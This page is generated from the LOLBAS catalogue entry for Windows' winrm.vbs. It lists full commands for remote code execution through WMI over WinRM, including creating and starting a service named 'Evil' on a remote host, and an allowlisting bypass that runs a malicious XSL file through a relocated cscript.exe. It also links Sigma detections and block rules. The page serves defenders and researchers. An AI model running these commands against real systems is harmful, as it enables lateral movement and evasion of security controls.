---
title: "winrm.vbs"
framework: "lolbas"
generated: "true"
source_path: "yml/OSScripts/Winrm.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml"
build_date: "2026-04-27 19:14:21"
category: "OSScripts"
aliases:
  - "winrm.vbs"
functions:
  - "Execute"
  - "AWL Bypass"
attack_technique_ids:
  - "T1216"
  - "T1220"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Script used for manage Windows RM settings

## Paths

- `C:\Windows\System32\winrm.vbs`
- `C:\Windows\SysWOW64\winrm.vbs`

## Commands

### 1. Execute

Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
```

- Use Case: Proxy execution
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution|T1216: System Script Proxy Execution]]

### 2. Execute

Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol

```cmd
winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
```

- Use Case: Proxy execution
- Privileges: Admin
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution|T1216: System Script Proxy Execution]]

### 3. AWL Bypass

Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.

```cmd
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
```

- Use Case: Execute arbitrary, unsigned code via XSL script
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1220-xsl_script_processing|T1220: XSL Script Processing]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules

## Resources

- {'Link': 'https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology'}
- {'Link': 'https://www.youtube.com/watch?v=3gz1QmiMhss'}
- {'Link': 'https://github.com/enigma0x3/windows-operating-system-archaeology'}
- {'Link': 'https://redcanary.com/blog/lateral-movement-winrm-wmi/'}
- {'Link': 'https://twitter.com/bohops/status/994405551751815170'}
- {'Link': 'https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404'}
- {'Link': 'https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf'}

## Acknowledgements

- {'Person': 'Matt Graeber', 'Handle': '@mattifestation'}
- {'Person': 'Matt Nelson', 'Handle': '@enigma0x3'}
- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'Jimmy', 'Handle': '@bohops'}
- {'Person': 'Red Canary Company cc Tony Lambert', 'Handle': '@redcanaryco'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml)
